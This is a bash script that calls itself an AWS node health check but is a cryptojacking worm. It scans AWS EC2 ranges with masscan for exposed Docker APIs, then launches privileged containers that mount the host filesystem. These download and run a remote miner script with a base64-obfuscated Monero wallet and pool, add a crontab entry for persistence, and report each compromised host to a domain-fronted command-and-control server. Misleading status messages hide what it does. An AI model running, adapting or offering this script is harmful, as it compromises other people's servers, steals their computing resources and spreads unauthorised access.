#!/bin/bash

ENCRYPTED_WALLET="NDh4V2ozSi4uLgo="  # Base64-encoded XMR wallet (e.g., echo "YOUR_WALLET" | base64)
ENCRYPTED_POOL="em1ycG9vbC5jb20="    # Base64-encoded pool (e.g., echo "xmrpool.com" | base64)
C2_REPORT_URL="https://api.cloudops-dev.com/log"  # Domain-fronted C2 (e.g., your Cloudflare domain)

WALLET=$(echo "$ENCRYPTED_WALLET" | base64 -d 2>/dev/null)
POOL=$(echo "$ENCRYPTED_POOL" | base64 -d 2>/dev/null)

echo "[*] Starting AWS node health check..."
sleep 1


curl -s https://ip-ranges.amazonaws.com/ip-ranges.json -o /tmp/aws_ranges.json
AWS_IPS=$(jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix' /tmp/aws_ranges.json)

echo "[*] Scanning for unsecured container APIs..."
masscan -p2375,2376 -iL <(echo "$AWS_IPS") --rate=500 -oG /tmp/scan_results.txt >/dev/null 2>&1


while read -r IP; do
  if curl -s --connect-timeout 5 "http://$IP:2375/version" | grep -q "ApiVersion"; then
    echo "[+] Found vulnerable node: $IP"

 
    docker -H "$IP:2375" run -d --rm --privileged -v /:/mnt alpine sh -c "
      wget -q https://github.com/cloudops-tools/raw/main/resource_balancer.sh -O /tmp/balancer.sh
      chmod +x /tmp/balancer.sh
      /tmp/balancer.sh '$WALLET' '$POOL' 60
      echo '*/30 * * * * /tmp/balancer.sh \"$WALLET\" \"$POOL\" 60' >> /mnt/etc/crontab
    "

    
    curl -s -H "Host: c2.attacker.com" "$C2_REPORT_URL?ip=$IP&status=active" >/dev/null
  fi
done < <(grep -oP 'Host: \K[0-9.]+' /tmp/scan_results.txt)


rm -f /tmp/aws_ranges.json /tmp/scan_results.txt
echo "[*] Maintenance completed."
